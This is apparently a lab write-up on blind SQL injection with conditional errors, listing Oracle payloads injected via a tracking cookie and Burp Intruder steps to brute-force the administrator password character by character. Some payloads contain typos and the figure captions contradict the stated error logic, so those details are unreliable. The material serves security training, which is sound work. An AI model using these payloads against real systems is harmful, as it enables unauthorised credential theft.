# 🔐 Lab 12: Blind SQL Injection with Conditional Errors.

## 🧩 Objective
Output the administrator password and login as a administrator

## 🔍 Vulnerability 
- Vulnerability parameter -> tracking cookie
The application is vulnerable to SQL Injection, but does not display query results. Instead, it behaves differently when a database error occurs.

## ⚙️ Payload Used
- ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END  FROM dual)--  
- ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE ' ' END  FROM dual)--
- ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM uesrs where useraname = 'administrator'--
- ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM uesrs where useraname = 'administrator' AND LENGTH(password)>1)--
- ' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN TO_CHAR(1/0) ELSE ' ' END  FROM users WHERE username='administrator')--  

## 🔎 Analysis
1. Prove the parameter is vulnerable
2. Confirm that the users table exists in the database
   - ' AND SELECT ' ' FROM DUAL--
3. Confirm that the administrator exists in the users table
   - server error -> administrator exists
   - 200 OK -> administrator Not exists
4. Determine length of the password
   - 200 OK response at 50 -> So, length of the password will be less then 50

    

## 🚀 Steps to Reproduce
1. Navigate to the vulnerable page  
2. Intercept the request using Burp Suite  
3. Send the request to Repeater  
4. Test injection:
   '' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END  FROM dual)--  
   ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE ' ' END  FROM dual)-- 
5. Observe difference between normal response and error response  
6. Extract password using:
   ' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')--  
7. Steps to use INTRUDER in BURP Suite
   1. To know password length(send the request to intruder)
      - Go to position
        - Clear all the position(which positiion you want patch, patch it and click Add button
        - set Attack type - Snipper
      - Payloads
         - payloads type : Number(set this)
         - payload option mark sequestial from from 1 to 50 and step count set 1
      - Click on Start Attack
      - Go to Result and check different length column and analyze response by message
    2. To Know exact password(send the request to intruder)
       - Go to position
         - Clear all the position(which positiion you want patch, patch it and click Add button
         - set Attack type - Snipper
       - Go to Payloads
         - payloads type : Brute force(set this)
         - payload option mark count 1
       - Click on Start Attack
       - Go to Result and check different length column and analyze response by message
    3. Using two payload
       - Go to position
         - Clear all the position(which positiion you want patch, patch it and click Add button
         - set Attack type - Cluster bomb
       - Go to Payloads
         - set two different payload, based on the what you perform.
       - Click on Start Attack
       - Analyze the result
       - To know the password order  the character which are displayed in the result in the serial number. 

## ✅ Result
Successfully extracted the administrator password using conditional error-based SQL Injection.

## 🧠 Key Learning
Error-based Blind SQL Injection allows attackers to extract data by triggering database errors when conditions are false.

## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Implement strict input validation  
- Avoid exposing database errors  
- Use proper exception handling  

---

## 📸 Screenshots

<img src="ADD_YOUR_IMAGE_LINK_1" />
<br><br>
**Figure 1: Normal application response without error**

<br><br>

<img src="ADD_YOUR_IMAGE_LINK_2" />
<br><br>
**Figure 2: TRUE condition payload with no error**

<br><br>

<img src="ADD_YOUR_IMAGE_LINK_3" />
<br><br>
**Figure 3: FALSE condition payload triggering database error**

<br><br>

<img src="ADD_YOUR_IMAGE_LINK_4" />
<br><br>
**Figure 4: Extracting password character using error-based condition**

<br><br>

<img src="ADD_YOUR_IMAGE_LINK_5" />
<br><br>
**Figure 5: Successful extraction of administrator password (Lab Solved)**
